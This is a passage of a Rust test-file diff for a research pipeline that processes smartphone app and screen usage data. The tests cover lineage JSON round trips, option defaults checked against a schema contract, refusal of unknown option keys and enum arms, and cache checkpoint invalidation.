+            json.contains(concat!(
+                r#""terminalQueryGroup":"outputs","#,
+                r#""screenIntervalId":"screen-interval-1","#,
+                r#""screenConstructionStrategyId":"strategy","#,
+                r#""screenIntervalKind":"kind","#,
+                r#""screenIntervalCloseReason":"reason","#,
+                r#""screenIntervalLeftCensored":true,"#,
+                r#""screenIntervalRightCensored":false,"#,
+                r#""schoedelCompletion":"complete"}"#,
+            )),
+            "{json}"
+        );
+        assert!(json.ends_with(r#""terminalQueryGroup":"outputs"}]"#), "{json}");
+        let round_tripped: Vec<PipelineRowLineage> =
+            serde_json::from_str(&json).expect("lineage from JSON");
+        assert_eq!(round_tripped, rows);
+        assert!(round_tripped[1].screen.is_none());
+        // The JSON wire shape is untouched: absent optionals stay absent.
+        let json = serde_json::to_string(&rows[1]).expect("json lineage");
+        assert!(!json.contains("screenIntervalId"), "{json}");
     }
 
     /// The Arrow evidence export writes the raw 32 digest bytes while the
@@ -9448,7 +5654,7 @@ mod tests {
         assert!(row.0.checkpoint_parts.classification.get().is_some());
 
         let hour = row.hour.saturating_add(1);
-        row.edit_temporal().hour = hour;
+        *row.edit_temporal().hour = hour;
         assert!(row.0.checkpoint_parts.identity.get().is_some());
         assert!(row.0.checkpoint_parts.temporal.get().is_none());
         assert!(row.0.checkpoint_parts.classification.get().is_some());
@@ -9464,7 +5670,7 @@ mod tests {
             "component cache must match a cold hash"
         );
 
-        row.edit_classification().application_label = "Changed".into();
+        *row.edit_classification().application_label = "Changed".into();
         assert!(row.0.checkpoint_parts.identity.get().is_some());
         assert!(row.0.checkpoint_parts.temporal.get().is_some());
         assert!(row.0.checkpoint_parts.classification.get().is_none());
@@ -9477,6 +5683,25 @@ mod tests {
         assert!(row.0.checkpoint_parts.identity.get().is_none());
         assert!(row.0.checkpoint_parts.temporal.get().is_none());
         assert!(row.0.checkpoint_parts.classification.get().is_none());
+
+        // A persisted row that carries checkpoint parts is foreign (the
+        // encoder writes None): the decoder hashes the data, never the parts.
+        let forged = with_serialized_row_string_table(|| {
+            postcard::to_allocvec(&PersistedRowRef {
+                data: &row.0.data,
+                identity: Some([7; 16]),
+                temporal: Some([7; 16]),
+                classification: Some([7; 16]),
+            })
+        })
+        .expect("encode forged row");
+        let decoded: Row = with_deserialized_row_string_pool(|| {
+            postcard::from_bytes(&forged).expect("decode forged row")
+        });
+        assert_eq!(
+            row_checkpoint_parts(&decoded, &mut scratch),
+            row_checkpoint_parts(&Row::new(row.0.data.clone()), &mut scratch),
+        );
     }
 
     /// The browser sends option JSON carrying only the settings it means to
@@ -9524,13 +5749,90 @@ mod tests {
         assert_eq!(parsed.device_liveness_gap_tolerance_minutes, 120.0);
         assert_eq!(parsed.auto_lock_bridge_seconds, 120.0);
         assert_eq!(parsed.no_witness_min_day_apps, 2);
-        assert_eq!(parsed.proximity_interval_ns, 0);
-        assert_eq!(parsed.minimum_usage_duration, 0.0);
+        assert_eq!(parsed.opener_set, "strategy_defined");
+        assert_eq!(parsed.proximity_interval_ns, 2_000_000_000);
+        assert_eq!(parsed.filter_match_field.value(), "app_package_name");
+        assert!(parsed.application_label_exclusions.value().is_empty());
+        assert_eq!(*parsed.aggregate_top_apps_limit.value(), 0);
+        assert_eq!(parsed.micro_use_classification_policy.value(), "none");
+        assert_eq!(*parsed.minimum_usage_duration.value(), 60.0);
+        assert_eq!(parsed.minimum_duration_comparator.value(), "strict_lt");
+        assert_eq!(
+            parsed.minimum_duration_disposition.value(),
+            "chronicle_blank_keep_row",
+        );
+        for omitted in [
+            parsed.micro_use_classification_policy.is_omitted(),
+            parsed.minimum_usage_duration.is_omitted(),
+            parsed.minimum_duration_comparator.is_omitted(),
+            parsed.minimum_duration_disposition.is_omitted(),
+            parsed.filter_match_field.is_omitted(),
+            parsed.application_label_exclusions.is_omitted(),
+            parsed.aggregate_top_apps_limit.is_omitted(),
+        ] {
+            assert!(omitted, "an absent B03/B04 key remains absent");
+        }
+        let converted = parsed.clone().into_pipeline_options();
+        assert!(!converted.micro_use_classification_policy_explicit);
+        assert!(!converted.minimum_usage_duration_explicit);
+        assert!(!converted.minimum_duration_comparator_explicit);
+        assert!(!converted.minimum_duration_disposition_explicit);
+        let omitted_wire = serde_json::to_value(&parsed).expect("omitted options reserialize");
+        for key in [
+            "micro_use_classification_policy",
+            "minimum_usage_duration",
+            "minimum_duration_comparator",
+            "minimum_duration_disposition",
+            "filter_match_field",
+            "application_label_exclusions",
+            "aggregate_top_apps_limit",
+        ] {
+            assert!(
+                omitted_wire.get(key).is_none(),
+                "omitted key {key} reappeared"
+            );
+        }
+        let mut explicit_request = minimal.clone();
+        explicit_request["micro_use_classification_policy"] = "none".into();
+        explicit_request["minimum_usage_duration"] = 60.0.into();
+        explicit_request["minimum_duration_comparator"] = "strict_lt".into();
+        explicit_request["minimum_duration_disposition"] = "chronicle_blank_keep_row".into();
+        explicit_request["filter_match_field"] = "app_package_name".into();
+        explicit_request["application_label_exclusions"] = serde_json::json!([]);
+        explicit_request["aggregate_top_apps_limit"] = 0.into();
+        let explicit_parsed: PipelineV2OptionsJson =
+            serde_json::from_value(explicit_request).expect("explicit defaults parse");
+        let explicit_wire =
+            serde_json::to_value(&explicit_parsed).expect("explicit options reserialize");
+        for key in [
+            "micro_use_classification_policy",
+            "minimum_usage_duration",
+            "minimum_duration_comparator",
+            "minimum_duration_disposition",
+            "filter_match_field",
+            "application_label_exclusions",
+            "aggregate_top_apps_limit",
+        ] {
+            assert!(
+                explicit_wire.get(key).is_some(),
+                "explicit key {key} disappeared"
+            );
+        }
+        let explicit_converted = explicit_parsed.into_pipeline_options();
+        assert!(explicit_converted.micro_use_classification_policy_explicit);
+        assert!(explicit_converted.minimum_usage_duration_explicit);
+        assert!(explicit_converted.minimum_duration_comparator_explicit);
+        assert!(explicit_converted.minimum_duration_disposition_explicit);
         assert_eq!(parsed.materialize_visualization_data, None);
         assert!(parsed.interaction_type_remap.is_empty());
         for (field, on) in [
             ("deduplicate_exact_rows", parsed.deduplicate_exact_rows),
             ("enable_plotting", parsed.enable_plotting),
+            ("enable_activity_heatmap", parsed.enable_activity_heatmap),
+            (
+                "include_app_usage_end_reason",
+                parsed.include_app_usage_end_reason,
+            ),
         ] {
             assert!(on, "{field} defaults on");
         }
@@ -9568,8 +5870,15 @@ mod tests {
                 parsed.enable_screen_gated_crediting,
             ),
             ("enable_aggregates", parsed.enable_aggregates),
-            ("enable_activity_heatmap", parsed.enable_activity_heatmap),
+            (
+                "enable_participant_amount_summary",
+                parsed.enable_participant_amount_summary,
+            ),
             ("export_plots_as_svg", parsed.export_plots_as_svg),
+            (
+                "neutralize_spreadsheet_formulas",
+                parsed.neutralize_spreadsheet_formulas.unwrap_or(false),
+            ),
             (
                 "enable_interactive_timeline",
                 parsed.enable_interactive_timeline,
@@ -9587,7 +5896,6 @@ mod tests {
             ("screen_usage", UsageSessionMode::ScreenUsage),
             ("app_and_screen_usage", UsageSessionMode::AppAndScreenUsage),
             ("app_usage", UsageSessionMode::AppUsage),
-            ("something else entirely", UsageSessionMode::AppUsage),
         ] {
             let mut request = minimal.clone();
             request["usage_session_mode"] = spelling.into();
@@ -9599,6 +5907,56 @@ mod tests {
                 "usage_session_mode {spelling}",
             );
         }
+        // The runtime plans app and screen work from this string, so a spelling
+        // the kernel does not know is refused instead of running as app usage
+        // under a plan that says nothing runs.
+        for spelling in ["something else entirely", "appUsage", "screen_usage "] {
+            let mut request = minimal.clone();
+            request["usage_session_mode"] = spelling.into();
+            let error = serde_json::from_value::<PipelineV2OptionsJson>(request)
+                .expect_err("an unknown mode is refused");
+            assert!(error.to_string().contains("unknown_usage_session_mode"), "{error}");
+        }
+
+        let mut request = minimal.clone();
+        request["opener_set"] = serde_json::Value::Null;
+        let options = serde_json::from_value::<PipelineV2OptionsJson>(request)
+            .expect("a null opener set is the omitted spelling")
+            .into_pipeline_options();
+        assert_eq!(options.opener_set, OpenerSet::StrategyDefined);
+
+        // An unknown arm is refused and named, never read as the default: the
+        // default is a different computation from the one that was asked for.
+        for (field, spelling) in [
+            ("opener_set", "future_narrow_arm"),
+            ("micro_use_classification_policy", "future_micro_policy"),
+            ("minimum_duration_comparator", "future_comparator"),
+            ("minimum_duration_disposition", "future_disposition"),
+        ] {
+            let mut request = minimal.clone();
+            request[field] = spelling.into();
+            let error = serde_json::from_value::<PipelineV2OptionsJson>(request)
+                .expect_err("an unknown arm is refused");
+            assert!(
+                error.to_string().contains(&format!("unknown_{field}: \"{spelling}\"")),
+                "{error}",
+            );
+        }
+
+        let mut request = minimal.clone();
+        request["minimum_duration_comparator"] = 7.into();
+        assert!(
+            serde_json::from_value::<PipelineV2OptionsJson>(request).is_err(),
+            "a malformed B04 field type must be rejected instead of widened",
+        );
+
+        let mut request = minimal.clone();
+        request["screen_session_construction_strategy"] = "future_screen_arm".into();
+        let error = serde_json::from_value::<PipelineV2OptionsJson>(request)
+            .expect_err("an unknown B05 strategy must fail closed");
+        assert!(error
+            .to_string()
+            .contains("unknown_screen_session_construction_strategy"));
 
         for (plotting, timeline, expected) in [
             (false, false, false),
@@ -9628,6 +5986,838 @@ mod tests {
             !options.materialize_visualization_data,
             "an explicit materialize_visualization_data has to win over the view settings",
         );
+    }
+
+    /// The committed snapshot of the researcher-facing contract: every option's
+    /// key, type and default, and every enum option's values, rebuilt from the
+    /// LinkML schema and diffed by `npm run check:contract`, so it cannot
+    /// disagree with `chronicle-local-contract.linkml.yaml`.
+    const CONTRACT_BASELINE: &str = include_str!("../../../web/schema/contract-baseline.json");
+
+    fn contract_baseline() -> serde_json::Value {
+        serde_json::from_str(CONTRACT_BASELINE).expect("contract-baseline.json is JSON")
+    }
+
+    /// The request key and wire value `buildRustV2Options` sends for one
+    /// contract option, or `None` for the two execution-only options the
+    /// browser never sends to the kernel. Everything not renamed here is the
+    /// camelCase key in snake_case, unchanged.
+    fn contract_option_as_request(
+        key: &str,
+        value: &serde_json::Value,
+    ) -> Option<(String, serde_json::Value)> {
+        let scaled = |factor: f64| {
+            serde_json::Value::from((value.as_f64().expect("a number") * factor).round() as i64)
+        };
+        let (request_key, request_value) = match key {
+            "parallelProcessing" | "parallelMaxWorkers" => return None,
+            "processAppUsage" => ("include_app_output", value.clone()),
+            "processScreenUsage" => ("include_screen_output", value.clone()),
+            // `options.selectedTimezone?.trim() || "UTC"`.
+            "selectedTimezone" => (
+                "timezone",
+                match value.as_str() {
+                    Some(zone) if !zone.trim().is_empty() => value.clone(),
+                    _ => "UTC".into(),
+                },
+            ),
+            "useAppsForcingScreenOpenFile" => ("use_apps_forcing_screen_open", value.clone()),
+            "longDurationThresholdHours" => ("long_duration_threshold_ns", scaled(3_600_000_000_000.0)),
+            "longDurationThresholdHoursExplicit" => ("long_duration_threshold_explicit", value.clone()),
+            "proximityIntervalSeconds" => ("proximity_interval_ns", scaled(1_000_000_000.0)),
+            "sameAppInteractionTypesToStopUsageAt" => ("same_app_stop_types", value.clone()),
+            "otherInteractionTypesToStopUsageAt" => ("other_stop_types", value.clone()),
+            "screenUsageAutoLockTimeoutSeconds" => ("screen_auto_lock_timeout_seconds", value.clone()),
+            "screenUsageAutoLockToleranceSeconds" => {
+                ("screen_auto_lock_tolerance_seconds", value.clone())
+            }
+            "screenUsageManualLockMaxTailGapSeconds" => {
+                ("screen_manual_lock_max_tail_seconds", value.clone())
+            }
+            "screenUsageKeyguardNearStopSeconds" => {
+                ("screen_keyguard_near_stop_seconds", value.clone())
+            }
+            other => {
+                let mut snake = String::with_capacity(other.len() + 8);
+                for character in other.chars() {
+                    if character.is_ascii_uppercase() {
+                        snake.push('_');
+                        snake.push(character.to_ascii_lowercase());
+                    } else {
+                        snake.push(character);
+                    }
+                }
+                return Some((snake, value.clone()));
+            }
+        };
+        Some((request_key.to_string(), request_value))
+    }
+
+    /// The request the browser builds from the contract's default options.
+    /// A `null` default is an option the browser omits until it is chosen.
+    fn contract_default_request() -> serde_json::Map<String, serde_json::Value> {
+        let baseline = contract_baseline();
+        let options = baseline["options"].as_object().expect("options");
+        let mut request = serde_json::Map::new();
+        for (key, record) in options {
+            let default = &record["default"];
+            if default.is_null() {
+                continue;
+            }
+            if let Some((request_key, value)) = contract_option_as_request(key, default) {
+                request.insert(request_key, value);
+            }
+        }
+        // Not contract options: derived from the two process toggles, and the
+        // runtime's run timestamp.
+        let app = options["processAppUsage"]["default"] == true;
+        let screen = options["processScreenUsage"]["default"] == true;
+        request.insert(
+            "usage_session_mode".into(),
+            match (app, screen) {
+                (true, true) => "app_and_screen_usage",
+                (true, false) => "app_usage",
+                (false, true) => "screen_usage",
+                (false, false) => "no_usage",
+            }
+            .into(),
+        );
+        request.insert(
+            "datetime_of_preprocessing".into(),
+            "2026-07-21 12:00:00 UTC".into(),
+        );
+        request
+    }
+
+    fn parse_request(
+        request: &serde_json::Map<String, serde_json::Value>,
+    ) -> Result<PipelineV2OptionsJson, serde_json::Error> {
+        serde_json::from_value(serde_json::Value::Object(request.clone()))
+    }
+
+    /// AI-built C7: the kernel's serde defaults are a second copy of the
+    /// contract defaults, and the old test compared them with literals, so
+    /// the two copies could drift with every test green (the contract says
+    /// 2 s of proximity grace and the activity heatmap on; an omitted key read
+    /// 0 s and off). Every key the browser sends is removed in turn: the
+    /// kernel must then either refuse the request (the key has no kernel
+    /// default) or produce exactly what the contract default produces.
+    #[test]
+    fn every_kernel_option_default_is_the_contract_default() {
+        fn same(left: &serde_json::Value, right: &serde_json::Value) -> bool {
+            match (left, right) {
+                (serde_json::Value::Number(left), serde_json::Value::Number(right)) => {
+                    left.as_f64() == right.as_f64()
+                }
+                (serde_json::Value::Array(left), serde_json::Value::Array(right)) => {
+                    left.len() == right.len()
+                        && left.iter().zip(right).all(|(left, right)| same(left, right))
+                }
+                _ => left == right,
+            }
+        }
+        // The effective configuration, with the presence bits cleared: an
+        // omitted key and an explicit default are the same value and differ
+        // only in how they are receipted.
+        fn effective(options: PipelineV2OptionsJson) -> String {
+            let mut options = options.into_pipeline_options();
+            options.micro_use_classification_policy_explicit = false;
+            options.minimum_usage_duration_explicit = false;
+            options.minimum_duration_comparator_explicit = false;
+            options.minimum_duration_disposition_explicit = false;
+            options.screen_session_construction_strategy_explicit = false;
+            format!("{options:?}")
+        }
+
+        let request = contract_default_request();
+        let full = parse_request(&request)
+            .unwrap_or_else(|error| panic!("the contract-default request parses: {error}"));
+        let full_effective = effective(full);
+        let mut kernel_required = std::collections::BTreeSet::new();
+        let mut drift = Vec::new();
+        for key in request.keys() {
+            if matches!(key.as_str(), "usage_session_mode" | "datetime_of_preprocessing") {
+                continue;
+            }
+            let mut omitted = request.clone();
+            omitted.remove(key);
+            let Ok(parsed) = parse_request(&omitted) else {
+                kernel_required.insert(key.as_str());
+                continue;
+            };
+            let wire = serde_json::to_value(&parsed).expect("options reserialize");
+            match wire.get(key) {
+                Some(kernel) if !kernel.is_null() => {
+                    if !same(kernel, &request[key]) {
+                        drift.push(format!(
+                            "{key}: contract default {}, kernel default {kernel}",
+                            request[key]
+                        ));
+                    }
+                }
+                _ => {
+                    if effective(parsed) != full_effective {
+                        drift.push(format!(
+                            "{key}: omitting it computes something other than the contract default {}",
+                            request[key]
+                        ));
+                    }
+                }
+            }
+        }
+        assert!(drift.is_empty(), "kernel defaults drifted from the contract: {drift:#?}");
+        // Named, not counted: a key that loses its kernel default is a choice.
+        assert_eq!(
+            kernel_required,
+            std::collections::BTreeSet::from([
+                "allow_stop_event_reuse",
+                "apply_threshold_to_fallback",
+                "correct_duplicate_event_timestamps",
+                "custom_app_engagement_duration",
+                "include_app_output",
+                "include_screen_output",
+                "interaction_types_to_remove",
+                "long_data_time_gap_thresholds",
+                "long_duration_threshold_ns",
+                "long_usage_duration_thresholds",
+                "other_stop_types",
+                "same_app_stop_types",
+                "screen_auto_lock_timeout_seconds",
+                "screen_auto_lock_tolerance_seconds",
+                "screen_keyguard_near_stop_seconds",
+                "screen_manual_lock_max_tail_seconds",
+                "study_name",
+                "timezone",
+                "use_activity_stopped_as_fallback",
+                "use_app_codebook",
+                "use_apps_forcing_screen_open",
+                "use_filter_file",
+            ]),
+        );
+    }
+
+    /// AI-built C3/K2: every enum option the contract publishes, each value
+    /// through the real request parser into the typed configuration, the
+    /// kernel's arms equal to the contract's values in both directions, and
+    /// a value outside them refused and named rather than computed as the
+    /// default. The older parity test covered five of these axes.
+    #[test]
+    fn every_contract_enum_option_round_trips_and_an_unknown_arm_is_refused() {
+        type Effective = fn(&PipelineV2Options) -> String;
+        fn ids<T: Copy>(arms: &[T], id: fn(T) -> &'static str) -> Vec<&'static str> {
+            arms.iter().map(|arm| id(*arm)).collect()
+        }
+        fn axis(request_key: &str) -> (Vec<&'static str>, Effective) {
+            match request_key {
+                "timezone_handling" => (TIMEZONE_HANDLING_MODES.to_vec(), |o| o.timezone_handling.clone()),
+                "aggregate_shape" => (AGGREGATE_SHAPES.to_vec(), |o| o.aggregate_shape.clone()),
+                "event_retention_set" => (ids(&EventRetentionSet::ALL, EventRetentionSet::canonical_id), |o| o.event_retention_set.canonical_id().into()),
+                "opener_set" => (ids(&OpenerSet::ALL, OpenerSet::canonical_id), |o| o.opener_set.canonical_id().into()),
+                "episode_reconstruction_strategy" => (ids(EpisodeReconstructionStrategy::ALL, EpisodeReconstructionStrategy::canonical_id), |o| o.episode_reconstruction_strategy.canonical_id().into()),
+                "micro_use_classification_policy" => (ids(&MicroUseClassificationPolicy::ALL, MicroUseClassificationPolicy::canonical_id), |o| o.micro_use_classification_policy.canonical_id().into()),
+                "day_boundary_attribution" => (ids(&DayBoundaryAttribution::ALL, DayBoundaryAttribution::canonical_id), |o| o.day_boundary_attribution.canonical_id().into()),
+                "filter_match_field" => (ids(&FilterMatchField::ALL, FilterMatchField::canonical_id), |o| o.filter_match_field.canonical_id().into()),
+                "package_exclusion_preset" => (ids(&PackageExclusionPreset::ALL, PackageExclusionPreset::canonical_id), |o| o.package_exclusion_preset.canonical_id().into()),
+                "minimum_duration_comparator" => (ids(&MinimumDurationComparator::ALL, MinimumDurationComparator::canonical_id), |o| o.minimum_duration_comparator.canonical_id().into()),
+                "minimum_duration_disposition" => (ids(&MinimumDurationDisposition::ALL, MinimumDurationDisposition::canonical_id), |o| o.minimum_duration_disposition.canonical_id().into()),
+                "interval_quality_policy" => (ids(&IntervalQualityPolicy::ALL, IntervalQualityPolicy::canonical_id), |o| o.interval_quality_policy.canonical_id().into()),
+                "session_grouping_policy" => (ids(SessionGroupingPolicy::ALL, SessionGroupingPolicy::canonical_id), |o| o.session_grouping_policy.canonical_id().into()),
+                "session_gap_basis" => (ids(SessionGapBasis::ALL, SessionGapBasis::canonical_id), |o| o.session_gap_basis.canonical_id().into()),
+                "session_boundary_scope" => (ids(SessionBoundaryScope::ALL, SessionBoundaryScope::canonical_id), |o| o.session_boundary_scope.canonical_id().into()),
+                "screen_session_construction_strategy" => (ids(&ScreenSessionConstructionStrategyId::ALL, ScreenSessionConstructionStrategyId::canonical_id), |o| o.screen_session_construction_strategy.canonical_id().into()),
+                "screen_session_classification_policy" => (ids(&ScreenSessionClassificationPolicy::ALL, ScreenSessionClassificationPolicy::canonical_id), |o| o.screen_session_classification_policy.canonical_id().into()),
+                "screen_session_maximum_duration_disposition" => (ids(&ScreenSessionMaximumDurationDisposition::ALL, ScreenSessionMaximumDurationDisposition::canonical_id), |o| o.screen_session_maximum_duration_disposition.canonical_id().into()),
+                "locked_screen_audio_disposition" => (ids(&LockedScreenAudioDisposition::ALL, LockedScreenAudioDisposition::canonical_id), |o| o.locked_screen_audio_disposition.canonical_id().into()),
+                "interaction_type_removal_mode" => (ids(&InteractionTypeRemovalMode::ALL, InteractionTypeRemovalMode::canonical_id), |o| o.interaction_type_removal_mode.canonical_id().into()),
+                "screen_gating_rule" => (ids(&ScreenGatingRule::ALL, ScreenGatingRule::canonical_id), |o| o.screen_gating_rule.canonical_id().into()),
+                "notification_proxy_rule" => (ids(&NotificationProxyRule::ALL, NotificationProxyRule::canonical_id), |o| o.notification_proxy_rule.canonical_id().into()),
+                "polled_emulation_method" => (ids(&PolledEmulationMethod::ALL, PolledEmulationMethod::canonical_id), |o| o.polled_emulation_method.canonical_id().into()),
+                "interval_expansion_method" => (ids(&IntervalExpansionMethod::ALL, IntervalExpansionMethod::canonical_id), |o| o.interval_expansion_method.canonical_id().into()),
+                // B06 travels as a set and is resolved, typed, after parsing.
+                "maximum_duration_policy" => (ids(&b06::MaximumDurationPolicy::ALL, b06::MaximumDurationPolicy::canonical_id), |o| o.maximum_duration.policy.clone().unwrap_or_default()),
+                "maximum_duration_disposition" => (ids(&b06::MaximumDurationDisposition::ALL, b06::MaximumDurationDisposition::canonical_id), |o| o.maximum_duration.disposition.clone().unwrap_or_default()),
+                "maximum_duration_threshold_source" => (ids(&b06::MaximumDurationThresholdSource::ALL, b06::MaximumDurationThresholdSource::canonical_id), |o| o.maximum_duration.threshold_source.clone().unwrap_or_default()),
+                other => panic!("{other} is a contract enum option this test has no row for"),
+            }
+        }
+        const B06_SELECTION: [(&str, &str); 3] = [
+            ("maximum_duration_policy", "strategy_native"),
+            ("maximum_duration_disposition", "not_applicable"),
+            ("maximum_duration_threshold_source", "strategy_native"),
+        ];
+        const UNKNOWN: &str = "not_a_contract_arm";
+
+        let baseline = contract_baseline();
+        let options = baseline["options"].as_object().expect("options");
+        let enums = baseline["enums"].as_object().expect("enums");
+        // Research axes are keyed by their option; the two plain contract
+        // enums by their enum name.
+        let mut contract_axes: Vec<(String, Vec<String>)> = enums
+            .iter()
+            .filter(|(key, _)| options.contains_key(*key))
+            .map(|(key, values)| (key.clone(), serde_json::from_value(values.clone()).expect("values")))
+            .collect();
+        for (option, enum_name) in [
+            ("timezoneHandling", "TimezoneHandlingMode"),
+            ("aggregateShape", "AggregateShape"),
+        ] {
+            contract_axes.push((
+                option.into(),
+                serde_json::from_value(enums[enum_name].clone()).expect("values"),
+            ));
+        }
+        assert_eq!(contract_axes.len(), 27, "contract enum options: {:?}", contract_axes.iter().map(|(key, _)| key).collect::<Vec<_>>());
+
+        let base = contract_default_request();
+        for (browser_key, values) in &contract_axes {
+            let (request_key, _) =
+                contract_option_as_request(browser_key, &serde_json::Value::Null).expect("sent");
+            let (arms, effective) = axis(&request_key);
+            let mut declared: Vec<&str> = values.iter().map(String::as_str).collect();
+            let mut implemented = arms.clone();
+            declared.sort_unstable();
+            implemented.sort_unstable();
+            assert_eq!(implemented, declared, "{request_key}: kernel arms vs contract values");
+
+            let b06 = B06_SELECTION.iter().any(|(key, _)| *key == request_key);
+            let with = |value: &str| {
+                let mut request = base.clone();
+                if b06 {
+                    for (key, arm) in B06_SELECTION {
+                        request.insert(key.into(), arm.into());
+                    }
+                }
+                request.insert(request_key.clone(), value.into());
+                request
+            };
+            for value in values {
+                let options = parse_request(&with(value))
+                    .unwrap_or_else(|error| panic!("{request_key}={value} parses: {error}"))
+                    .into_pipeline_options();
+                assert_eq!(effective(&options), *value, "{request_key}={value}");
+                if b06 {
+                    assert!(
+                        match request_key.as_str() {
+                            "maximum_duration_policy" => b06::MaximumDurationPolicy::from_canonical_id_strict(value).map(|arm| arm.canonical_id() == value),
+                            "maximum_duration_disposition" => b06::MaximumDurationDisposition::from_canonical_id_strict(value).map(|arm| arm.canonical_id() == value),
+                            _ => b06::MaximumDurationThresholdSource::from_canonical_id_strict(value).map(|arm| arm.canonical_id() == value),
+                        } == Ok(true),
+                        "{request_key}={value} resolves to its own arm",
+                    );
+                }
+            }
+
+            let unknown = with(UNKNOWN);
+            if b06 {
+                // Parsed as a raw vector, then refused before anything runs.
+                let options = parse_request(&unknown).expect("B06 is judged at resolution").into_pipeline_options();
+                assert_eq!(
+                    validate_pipeline_v2_options(&options).map_err(|error| error.to_string()),
+                    Err(PipelineV2OptionsValidationError::MaximumDuration(
+                        b06::MaximumDurationRefusalReason::RequestShapeInvalid
+                    )
+                    .to_string()),
+                    "{request_key}",
+                );
+            } else {
+                let error = parse_request(&unknown).expect_err("an unknown arm is refused");
+                assert!(
+                    error.to_string().contains(&format!("unknown_{request_key}")),
+                    "{request_key}: {error}",
+                );
+            }
+        }
+    }
+
+    /// An option key the kernel does not know is a renamed or stale key, and
+    /// without `deny_unknown_fields` serde drops it and the field silently
+    /// takes its published default — the run then computes something other
+    /// than what was asked for and reports nothing. The enclosing
+    /// `RuntimeRequest` has refused unknown members all along; this pins the
+    /// same refusal on the options document itself.
+    #[test]
+    fn an_unknown_option_key_is_refused_and_named() {
+        let request = minimal_options_request();
+
+        // Non-vacuity: the correctly spelled key is read, and the value used
+        // here is not the value an ignored key would have left behind.
+        let mut spelled = request.clone();
+        spelled["credited_session_cap_minutes"] = 999.0.into();
+        let parsed: PipelineV2OptionsJson =
+            serde_json::from_value(spelled).expect("the correctly spelled key parses");
+        assert_eq!(parsed.credited_session_cap_minutes, 999.0);
+        assert_ne!(
+            parsed.credited_session_cap_minutes,
+            serde_json::from_value::<PipelineV2OptionsJson>(request.clone())
+                .expect("the minimal request parses")
+                .credited_session_cap_minutes,
+            "the probe value equals the default, so an ignored key would be invisible",
+        );
+
+        let mut stale = request;
+        stale["credited_session_cap_mins"] = 999.0.into();
+        let error = serde_json::from_value::<PipelineV2OptionsJson>(stale)
+            .expect_err("an unknown option key must be refused, not defaulted");
+        assert!(
+            error.to_string().contains("credited_session_cap_mins"),
+            "the refusal must name the offending key, got: {error}",
+        );
+    }
+
+    /// Every real-valued option reaches a comparison, an integer conversion,
+    /// or a `to_bits()` Salsa cache key, and none of those reject `NaN` or an
+    /// infinity: an infinite bound silently answers every comparison, and the
+    /// two `NaN` spellings key as different inputs for the same request.
+    ///
+    /// The JSON ingress is measured here, not assumed: `serde_json` refuses
+    /// `1e999` outright ("number out of range"), and JavaScript's
+    /// `JSON.stringify` turns `Infinity` and `NaN` into `null`, which fails
+    /// the `f64` field type. So a browser request cannot carry a non-finite
+    /// number today, and the first assertion below fails loudly if that ever
+    /// stops being true. The gate exists for the other producers of this
+    /// public type — the native profiling examples, the campaign harnesses,
+    /// and any future caller that builds `PipelineV2Options` directly, none of
+    /// which pass through serde at all.
+    ///
+    /// The covered set is not a hand list: `real_valued_option_fields` is an
+    /// exhaustive `#[deny(unused_variables)]` destructure of
+    /// `PipelineV2Options`, so a new option must be classified there, and the
+    /// setter table below is asserted to cover exactly the fields it names.
+    #[test]
+    fn every_real_valued_option_refuses_a_non_finite_request_value() {
+        #[deny(unused_variables)]
+        fn real_valued_option_fields(options: &PipelineV2Options) -> BTreeSet<&'static str> {
+            fn real<T: ?Sized>(name: &'static str, _field: &T) -> Option<&'static str> {
+                Some(name)
+            }
+            fn not_real<T: ?Sized>(_field: &T) -> Option<&'static str> {
+                None
+            }
+            let PipelineV2Options {
+                study_name,
+                timezone,
+                timezone_handling,
+                usage_session_mode,
+                include_app_output,
+                include_screen_output,
+                use_filter_file,
+                use_apps_forcing_screen_open,
+                use_background_apps_file,
+                use_app_codebook,
+                include_category_column,
+                include_app_usage_end_reason,
+                neutralize_spreadsheet_formulas,
+                deduplicate_exact_rows,
+                drop_out_of_source_order_events,
+                interaction_type_remap,
+                correct_duplicate_event_timestamps,
+                allow_stop_event_reuse,
+                use_activity_stopped_as_fallback,
+                apply_threshold_to_fallback,
+                long_duration_threshold_ns,
+                proximity_interval_ns,
+                custom_app_engagement_duration,
+                long_data_time_gap_thresholds,
+                long_usage_duration_thresholds,
+                same_app_stop_types,
+                other_stop_types,
+                interaction_types_to_remove,
+                interaction_type_removal_mode,
+                screen_auto_lock_timeout_seconds,
+                screen_auto_lock_tolerance_seconds,
+                screen_manual_lock_max_tail_seconds,
+                screen_keyguard_near_stop_seconds,
+                datetime_of_preprocessing,
+                model_concurrent_usage,
+                micro_use_classification_policy,
+                micro_use_classification_policy_explicit,
+                minimum_usage_duration,
+                minimum_usage_duration_explicit,
+                minimum_duration_comparator,
+                minimum_duration_comparator_explicit,
+                minimum_duration_disposition,
+                minimum_duration_disposition_explicit,
+                apply_minimum_usage_duration_to_concurrent_subintervals,
+                filter_zero_duration_sessions,
+                add_no_activity_placeholder_days,
+                enable_study_window_filter,
+                enable_person_attribution,
+                enable_day_coverage,
+                enable_compliance_scoring,
+                compliance_threshold_percent,
+                enable_screen_gated_crediting,
+                screen_gating_rule,
+                day_boundary_attribution,
+                package_exclusion_preset,
+                notification_proxy_rule,
+                polled_emulation_method,
+                polled_emulation_interval_seconds,
+                polled_emulation_gap_seconds,
+                interval_expansion_method,
+                enable_aggregates,
+                aggregate_shape,
+                aggregate_top_apps_limit,
+                enable_participant_amount_summary,
+                materialize_visualization_data,
+                credited_session_cap_minutes,
+                device_liveness_gap_tolerance_minutes,
+                auto_lock_bridge_seconds,
+                no_witness_min_day_apps,
+                screen_session_construction_strategy,
+                screen_session_construction_strategy_explicit,
+                screen_session_classification_policy,
+                screen_session_maximum_duration_minutes,
+                screen_session_maximum_duration_disposition,
+                locked_screen_audio_disposition,
+                opener_set,
+                episode_reconstruction_strategy,
+                interval_quality_policy,
+                session_grouping_policy,
+                session_gap_basis,
+                session_boundary_scope,
+                emit_session_break_lineage,
+                event_retention_set,
+                maximum_duration,
+                filter_match_field,
+                application_label_exclusions,
+            } = options;
+            [
+                not_real(study_name),
+                not_real(timezone),
+                not_real(timezone_handling),
+                not_real(usage_session_mode),
+                not_real(include_app_output),
+                not_real(include_screen_output),
+                not_real(use_filter_file),
+                not_real(filter_match_field),
+                not_real(application_label_exclusions),
+                not_real(use_apps_forcing_screen_open),
+                not_real(use_background_apps_file),
+                not_real(use_app_codebook),
+                not_real(include_category_column),
+                not_real(include_app_usage_end_reason),
+                not_real(neutralize_spreadsheet_formulas),
+                not_real(deduplicate_exact_rows),
